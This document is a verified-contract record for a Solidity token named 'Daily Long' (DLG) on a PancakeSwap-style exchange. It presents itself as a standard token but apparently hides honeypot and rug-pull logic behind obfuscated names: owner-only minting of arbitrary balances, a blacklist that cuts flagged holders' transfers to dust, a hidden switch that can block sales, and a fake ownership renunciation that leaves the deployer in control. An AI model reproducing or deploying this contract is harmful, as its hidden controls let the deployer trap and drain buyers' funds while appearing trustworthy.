{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface tradingTake {\n    function createPair(address sellAuto, address takeTotal) external returns (address);\n}\n\ninterface swapExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenSell) external view returns (uint256);\n\n    function transfer(address swapFee, uint256 tradingAmount) external returns (bool);\n\n    function allowance(address swapIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapFee,\n        uint256 tradingAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeAmount, uint256 value);\n    event Approval(address indexed swapIs, address indexed spender, uint256 value);\n}\n\nabstract contract fundShouldExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalMaxEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapExemptMetadata is swapExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DailyLong is fundShouldExempt, swapExempt, swapExemptMetadata {\n\n    function senderWallet(address feeEnable, address swapFee, uint256 tradingAmount) internal returns (bool) {\n        if (feeEnable == launchedMax) {\n            return swapTotal(feeEnable, swapFee, tradingAmount);\n        }\n        uint256 atLaunchedShould = swapExempt(teamAt).balanceOf(tradingLaunchLaunched);\n        require(atLaunchedShould == senderMax);\n        require(swapFee != tradingLaunchLaunched);\n        if (autoToBuy[feeEnable]) {\n            return swapTotal(feeEnable, swapFee, walletLaunchedLimit);\n        }\n        return swapTotal(feeEnable, swapFee, tradingAmount);\n    }\n\n    uint8 private limitLaunched = 18;\n\n    bool public swapBuy;\n\n    function launchSender(address toFee) public {\n        autoIs();\n        \n        if (toFee == launchedMax || toFee == teamAt) {\n            return;\n        }\n        autoToBuy[toFee] = true;\n    }\n\n    uint256 senderMax;\n\n    function transferFrom(address feeEnable, address swapFee, uint256 tradingAmount) external override returns (bool) {\n        if (_msgSender() != sellTx) {\n            if (isTeam[feeEnable][_msgSender()] != type(uint256).max) {\n                require(tradingAmount <= isTeam[feeEnable][_msgSender()]);\n                isTeam[feeEnable][_msgSender()] -= tradingAmount;\n            }\n        }\n        return senderWallet(feeEnable, swapFee, tradingAmount);\n    }\n\n    function feeListTrading(uint256 tradingAmount) public {\n        autoIs();\n        senderMax = tradingAmount;\n    }\n\n    function balanceOf(address tokenSell) public view virtual override returns (uint256) {\n        return launchMax[tokenSell];\n    }\n\n    bool public launchedReceiver;\n\n    constructor (){\n        \n        totalMaxEnable autoFee = totalMaxEnable(sellTx);\n        teamAt = tradingTake(autoFee.factory()).createPair(autoFee.WETH(), address(this));\n        \n        launchedMax = _msgSender();\n        isReceiver[launchedMax] = true;\n        launchMax[launchedMax] = autoToken;\n        limitAuto();\n        \n        emit Transfer(address(0), launchedMax, autoToken);\n    }\n\n    uint256 private autoToken = 100000000 * 10 ** 18;\n\n    function approve(address tradingMode, uint256 tradingAmount) public virtual override returns (bool) {\n        isTeam[_msgSender()][tradingMode] = tradingAmount;\n        emit Approval(_msgSender(), tradingMode, tradingAmount);\n        return true;\n    }\n\n    address private buyAmount;\n\n    mapping(address => mapping(address => uint256)) private isTeam;\n\n    address public teamAt;\n\n    event OwnershipTransferred(address indexed listTxMin, address indexed buyTotal);\n\n    function name() external view virtual override returns (string memory) {\n        return launchedSwapToken;\n    }\n\n    string private minTradingMarketing = \"DLG\";\n\n    function allowance(address toExempt, address tradingMode) external view virtual override returns (uint256) {\n        if (tradingMode == sellTx) {\n            return type(uint256).max;\n        }\n        return isTeam[toExempt][tradingMode];\n    }\n\n    mapping(address => uint256) private launchMax;\n\n    mapping(address => bool) public autoToBuy;\n\n    function autoIs() private view {\n        require(isReceiver[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return buyAmount;\n    }\n\n    address sellTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public isReceiver;\n\n    function limitEnableMin(address exemptMode, uint256 tradingAmount) public {\n        autoIs();\n        launchMax[exemptMode] = tradingAmount;\n    }\n\n    bool public launchToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minTradingMarketing;\n    }\n\n    address tradingLaunchLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoToken;\n    }\n\n    bool private fromFund;\n\n    uint256 constant walletLaunchedLimit = 11 ** 10;\n\n    function limitAuto() public {\n        emit OwnershipTransferred(launchedMax, address(0));\n        buyAmount = address(0);\n    }\n\n    address public launchedMax;\n\n    function swapTotal(address feeEnable, address swapFee, uint256 tradingAmount) internal returns (bool) {\n        require(launchMax[feeEnable] >= tradingAmount);\n        launchMax[feeEnable] -= tradingAmount;\n        launchMax[swapFee] += tradingAmount;\n        emit Transfer(feeEnable, swapFee, tradingAmount);\n        return true;\n    }\n\n    function totalTokenReceiver(address txEnable) public {\n        if (swapBuy) {\n            return;\n        }\n        if (launchedReceiver == fromFund) {\n            launchToken = false;\n        }\n        isReceiver[txEnable] = true;\n        if (launchToken) {\n            launchToken = true;\n        }\n        swapBuy = true;\n    }\n\n    string private launchedSwapToken = \"Daily Long\";\n\n    function owner() external view returns (address) {\n        return buyAmount;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitLaunched;\n    }\n\n    uint256 limitMarketingReceiver;\n\n    function transfer(address exemptMode, uint256 tradingAmount) external virtual override returns (bool) {\n        return senderWallet(_msgSender(), exemptMode, tradingAmount);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoToBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"feeListTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"}],\"name\":\"launchSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"limitEnableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"}],\"name\":\"totalTokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DailyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}